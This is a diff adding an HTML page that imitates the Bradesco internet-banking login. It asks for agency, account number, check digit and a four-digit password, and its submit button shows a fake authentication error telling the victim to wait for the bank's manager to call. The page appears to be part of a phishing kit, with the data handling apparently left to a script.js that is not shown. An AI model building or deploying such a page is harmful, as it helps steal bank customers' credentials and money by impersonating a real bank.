@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="spanalert" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.14.3/dist/sweetalert2.min.css">
+    <link rel="icon" href="img/icon.png" type="image/png">
+    <title>Internet Banking Bradesco</title>
+</head>
+<style>
+    body {
+        background-color: #dc2929; /* Cor de fundo */
+        opacity: 0; /* Começa invisível */
+        transition: opacity 3s ease; /* Efeito de transição */
+        font-family: Arial, sans-serif;
+        text-align: center; /* Centraliza o texto */
+    }
+    body.fade-in {
+        opacity: 1; /* Torna o fundo visível */
+    }
+    .input-group {
+        margin: 20px 0;
+    }
+</style>
+<body>
+    <img src="img/acesse.jpg" alt="Cabeçalho" class="imagem-cabecalho">
+    <div class="container">
+        <img src="img/title.png" alt="Logo do Bradesco" class="logo">
+        <h2><img src="img/a29839242342.jpg" alt="" id="src"></h2>
+        <form id="formulario" onsubmit="return validarFormulario()">
+            <div class="input-group">
+                <label for="agencia">Agência:</label>
+                <input type="text" id="agencia" name="agencia" placeholder="Insira a agência sem o dígito" maxlength="4">
+            </div>
+            <script>
+                document.getElementById('agencia').addEventListener('input', function() {
+                    this.value = this.value.replace(/[^0-9]/g, ''); // Remove caracteres não numéricos
+
+                    if (this.value.length > 4) {
+                        this.value = this.value.slice(0, 4);
+                    }
+                });
+            </script>
+            <div class="input-group">
+                <label for="conta">Conta:</label>
+                <input type="text" id="conta" name="conta" required maxlength="8"> <!-- 5 dígitos -->
+                <label for="digitoConta" style="margin-left: 10px;">Dígito:</label>
+                <input type="text" id="digitoConta" name="digitoConta" required maxlength="1"> <!-- 1 dígito -->
+            </div>
+            <script>
+                document.getElementById('conta').addEventListener('input', function(){
+                    // Remove caracteres não numéricos
+                    this.value = this.value.replace(/[^0-9]/g, '');
+
+                    if (this.value.length > 8) {
+                        this.value = this.value.slice(0, 8);
+                    }
+                });
+            </script>
+            <div class="input-group">
+                <label for="senha">Senha (4 dígitos):</label>
+                <input type="password" id="senha" name="senha" required maxlength="4">
+            </div>
+            <div class="input-group">
+                <button type="submit">
+                    <img src="img/avancar.png" onclick="alert('Não foi possivel realizar a autenticação, aguardar contato da Gerência de seu Banco')">
+                </button>
+            </div>
+            <img src="img/a2836472346238.jpg" alt="Imagem Menor" class="imagem-menor">
+        </form>
+        
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
